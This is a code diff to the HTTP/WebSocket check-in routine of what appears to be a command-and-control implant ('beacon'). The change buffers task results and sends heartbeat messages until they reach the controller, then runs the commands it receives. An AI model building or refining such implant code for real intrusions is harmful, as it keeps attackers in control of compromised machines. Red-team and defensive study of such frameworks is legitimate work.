@@ -755,13 +755,24 @@ bool BeaconHttp::tryHttpCheckIn(const std::string& output, std::string& input)
 
 void BeaconHttp::checkIn()
 {
-    std::string output;
-    taskResultsToCmd(output);
+    if (m_pendingOutput.empty())
+    {
+        C2Message exchange;
+        exchange.set_instruction(HttpExchangeCmd);
+        exchange.set_cmd(random_string(SizeBeaconHash));
+        m_taskResult.push(exchange);
+        taskResultsToCmd(m_pendingOutput);
+    }
 
     std::string input;
-    if (!tryWebSocketCheckIn(output, input))
-        tryHttpCheckIn(output, input);
+    bool delivered = tryWebSocketCheckIn(m_pendingOutput, input);
+    if (!delivered)
+        delivered = tryHttpCheckIn(m_pendingOutput, input);
 
-    if (!input.empty())
-        cmdToTasks(input);
+    if (delivered)
+    {
+        if (!input.empty())
+            cmdToTasks(input);
+        m_pendingOutput.clear();
+    }
 }
